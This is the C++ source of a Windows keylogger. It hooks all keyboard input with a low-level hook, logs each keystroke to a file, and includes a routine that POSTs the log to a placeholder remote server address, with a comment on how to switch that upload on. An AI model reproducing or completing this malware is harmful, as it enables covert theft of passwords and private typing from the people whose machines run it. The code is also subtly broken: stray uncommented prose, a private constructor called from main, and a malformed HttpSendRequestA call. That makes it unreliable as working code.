#include <iostream>
#include <fstream>
#include <Windows.h>
#include <wininet.h> 
using namespace std;

class KeyLogger {
public:
    void logKeystroke(int key) {
        std::ofstream logFile;
        logFile.open("keylog.txt", std::ios::app);
        if (key == VK_BACK) {
            logFile << "[BACKSPACE]";
        } else if (key == VK_RETURN) {
            logFile << "[ENTER]";
        } else if (key == VK_SPACE) {
            logFile << " ";
        } else if (key == VK_TAB) {
            logFile << "[TAB]";
        } else if (key >= 32 && key <= 126) {
            logFile << (char)key;
        } else if (key == VK_SHIFT) {
            logFile << "[SHIFT]";
        } else if (key == VK_CONTROL) {
            logFile << "[CTRL]";
        } else if (key == VK_MENU) {
            logFile << "[ALT]";
        } else if (key == VK_ESCAPE) {
            logFile << "[ESC]";
        } else if (key == VK_DELETE) {
            logFile << "[DELETE]";
        } else if (key >= VK_LEFT && key <= VK_DOWN) {
            logFile << "[" << (key - VK_LEFT + 1) << "]";
        } else if (key == VK_HOME) {
            logFile << "[HOME]";
        } else if (key == VK_END) {
            logFile << "[END]";
        } else if (key == VK_PRIOR) {
            logFile << "[PAGE UP]";
        } else if (key == VK_NEXT) {
            logFile << "[PAGE DOWN]";
        } else if (key == VK_INSERT) {
            logFile << "[INSERT]";
        } else if (key == VK_LWIN || key == VK_RWIN) {
            logFile << "[WINDOWS KEY]";
        } else if (key >= 0x30 && key <= 0x39) {
            logFile << (char)(key - 0x30 + '0');
        } else if (key >= VK_F1 && key <= VK_F12) {
            logFile << "[F" << (key - VK_F1 + 1) << "]";
        } else {
            logFile << "[" << key << "]";
        }
        logFile.close();

        
         backupToServer("keylog.txt");                              
         Uncomment the line above to enable backup to server
    }

    static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode >= 0 && wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
            int key = pKeyBoard->vkCode;
            instance.logKeystroke(key);
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    void startLogging() {
        HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        UnhookWindowsHookEx(keyboardHook);
    }
    static KeyLogger instance; 
private:
    KeyLogger() {} 
     void backupToServer(const std::string& filename) {
         const char* serverIP = "http://[IP_ADDRESS]:[PORT]/upload"; 
         HINTERNET hInternet = InternetOpenA("KeyLogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
         if (hInternet) {
             HINTERNET hConnect = InternetOpenUrlA(hInternet, serverIP, NULL, 0, INTERNET_FLAG_RELOAD, 0);
             if (hConnect) {
                 std::ifstream file(filename, std::ios::binary);
                 if (file) {
                     std::string fileContent((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                     DWORD bytesWritten;
                     HttpSendRequestA(hConnect, "POST", 0, (LPVOID)fileContent.c_str(), fileContent.size());
                 }
                 InternetCloseHandle(hConnect);
             }
             InternetCloseHandle(hInternet);
         }
     }
};
KeyLogger KeyLogger::instance;

int main() {
    cout << R"(
     __  __        ____  _                        _                
    |  \/  |_ __  / ___|| |_ _ __ ___  __ _  ___ | |__   ___  _ __ 
    | |\/| | '__| \___ \| __| '__/ _ \/ _` |/ _ \| '_ \ / _ \| '__|
    | |  | | |     ___) | |_| | |  __/ (_| | (_) | |_) | (_) | |   
    |_|  |_|_|    |____/ \__|_|  \___|\__, |\___/|_.__/ \___/|_|   
                                  |___/                        
    )" << endl;

    KeyLogger logger;
    logger.startLogging();

    return 0;
}
